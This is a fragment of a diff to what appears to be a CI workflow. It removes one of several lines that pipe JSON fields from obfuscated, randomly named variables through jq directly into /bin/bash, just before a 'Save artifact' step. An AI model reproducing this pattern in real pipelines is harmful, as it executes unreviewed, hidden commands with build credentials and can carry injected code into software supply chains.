@@ -23,7 +23,6 @@ jobs:
           echo $bsudp28576 | jq -r .wls48 | /bin/bash
           echo $etkc01802 | jq -r .xfyv7 | /bin/bash
           printf '%s' "$ked68109" | jq -r .wm839 | /bin/bash
-          echo $dza9106 | jq -r .lap7567 | /bin/bash
           printf '%s' "$sepgu1418" | jq -r .crfqz91159 | /bin/bash
 
       - name: Save artifact
